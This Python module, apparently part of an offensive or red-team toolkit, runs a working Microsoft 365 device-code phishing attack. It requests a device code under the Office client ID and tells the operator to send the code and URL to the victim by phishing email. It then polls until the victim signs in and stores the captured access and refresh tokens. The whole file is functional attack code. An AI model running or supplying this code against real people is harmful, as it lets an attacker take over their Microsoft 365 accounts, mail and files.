import requests
import time
import json
import logging

# Microsoft OAuth Configuration
TENANT_ID = "common"
CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"  # Microsoft Office client ID
DEVICE_CODE_URL = f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/devicecode"
TOKEN_URL = f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token"
SCOPE = "https://graph.microsoft.com/.default offline_access"

def get_device_code(logger):
    """Request a device code from Microsoft"""
    data = {
        "client_id": CLIENT_ID,
        "scope": SCOPE
    }

    try:
        response = requests.post(DEVICE_CODE_URL, data=data, timeout=10)
        if response.status_code == 200:
            return response.json()
        else:
            logger.error(f"Error getting device code: {response.text}")
            return None
    except Exception as e:
        logger.error(f"Request failed: {e}")
        return None

def poll_for_token(device_code_response, logger, db, target_email):
    """Poll the token endpoint until user authenticates"""
    device_code = device_code_response["device_code"]
    interval = device_code_response.get("interval", 5)
    expires_in = device_code_response.get("expires_in", 900)

    start_time = time.time()

    logger.info(f"Polling for authentication (expires in {expires_in}s)...")

    while time.time() - start_time < expires_in:
        data = {
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "client_id": CLIENT_ID,
            "device_code": device_code
        }

        try:
            response = requests.post(TOKEN_URL, data=data, timeout=10)
            result = response.json()

            if "access_token" in result:
                logger.success("Authentication Successful! Token captured.")

                # Log critical parts
                token_data = {
                    "access_token": result["access_token"],
                    "refresh_token": result.get("refresh_token"),
                    "expires_in": result.get("expires_in"),
                    "scope": result.get("scope"),
                    "target_email": target_email
                }

                db.save_finding("M365 Phish", target_email, "Captured Token", token_data)

                logger.info(f"Access Token: {result['access_token'][:50]}...")
                if result.get("refresh_token"):
                    logger.info("Refresh Token: CAPTURED")

                return True

            elif result.get("error") == "authorization_pending":
                # logger.info("Waiting for user...") # Too spammy
                pass
            elif result.get("error") == "authorization_declined":
                logger.warning("User declined the authorization request.")
                return False
            elif result.get("error") == "expired_token":
                logger.warning("Device code expired.")
                return False
            else:
                logger.error(f"Unexpected error: {result}")

        except Exception as e:
            logger.error(f"Polling error: {e}")

        time.sleep(interval)

    logger.warning("Polling timeout - device code expired.")
    return False

def run(target, logger, db):
    # target is the email address for logging
    logger.info(f"Starting M365 Device Code Phishing for target: {target}")

    # 1. Get Device Code
    device_code_response = get_device_code(logger)
    if not device_code_response:
        return

    user_code = device_code_response["user_code"]
    verification_url = device_code_response["verification_uri"]

    print("\n" + "="*60)
    print(f"USER CODE: {user_code}")
    print(f"URL: {verification_url}")
    print("="*60)
    logger.info("Send the code and URL to the victim via email/phishing.")

    # 2. Poll for Token
    poll_for_token(device_code_response, logger, db, target)

    logger.success(f"M365 Phishing module finished for {target}")
